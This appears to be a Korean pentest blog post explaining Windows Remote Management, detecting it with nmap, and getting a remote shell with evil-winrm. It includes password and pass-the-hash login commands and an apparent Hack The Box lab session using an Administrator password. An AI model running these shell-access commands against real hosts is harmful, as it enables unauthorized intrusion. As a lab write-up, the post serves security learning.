---
title: Windows Remote Management (WinRM)
categories: [Pentest, Windows]
tags: [WinRM, wsman, Windows, Evil-WinRM]
image:
    path: /assets/image_post/20240213174835.png
---

Windows Remote Management (WinRM)이란 MS Windows에서 원격 관리를 위한 서비스이다. 모든 컴퓨터 장치와 관리 데이터를 원격으로 교환하기 위한 WS-Management 프로토콜을 MS에서 구현한 것이다.

WinRM 2.0에서 기본적으로 사용하는 http port는 5985, https는 5986이다. 해당 기능을 사용하고 있는 서버에 nmap으로 조회 시 아래와 같은 결과를 얻을 수 있다. wsman은 WS-Management을 뜻한다.

*※ 추가: 47001 port도 주로 사용되는 port 중 하나이다.*
``` bash
┌──(root㉿kali)-[/home/user]
└─# nmap 10.129.16.102 -p 5985
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 02:50 EST
Nmap scan report for 10.129.16.102
Host is up (0.31s latency).

PORT     STATE SERVICE
5985/tcp open  wsman
```
nmap의 옵션을 변경하여 조회 시 아래와 같이 나온다. `wsman`란 단어는 보이지 않고 `Microsoft HTTPAPI httpd 2.0`란 단어를 확인할 수 있다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# nmap -sC -sV 10.129.16.102 -p 5985
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-13 02:43 EST
Nmap scan report for 10.129.16.102
Host is up (0.26s latency).

PORT     STATE SERVICE VERSION
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

대부분의 기능이 그렇지만, 편의성이 좋다는 것은 공격에 사용될 수 있다는 것을 뜻한다. WinRM 관련해 kali linux에 탑재된 `evil-winrm`을 사용하여 원격 쉘을 획득 할 수 있다. 기본적인 사용 방법은 아래와 같다.

``` bash
evil-winrm -i <target-ip> -u username -p password
# -P: Specifify port
evil-winrm -i <target-ip> -P 5986 -u username -p password

# Pass The Hash (-H)
evil-winrm -i <target-ip> -P 5986 -u username -H 0e0363213e37b94221497260b0bcb4fc

# PowerShell Local Path (-s)
evil-winrm -i <target-ip> -u username -p password -s /opt/scripts

# SSL enabled (-S)
evil-winrm -i <target-ip> -u username -p password -S
```

아래의 경우 hack the box의 responder 문제를 풀던 중에 시도한 내역이다. id와 pw를 알고 있어 쉽게 원격 쉘 획득에 성공했다.
``` bash
┌──(root㉿kali)-[/home/user]
└─# evil-winrm -i 10.129.16.102 -u Administrator -p badminton

Evil-WinRM shell v3.5

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
responder\administrator
```
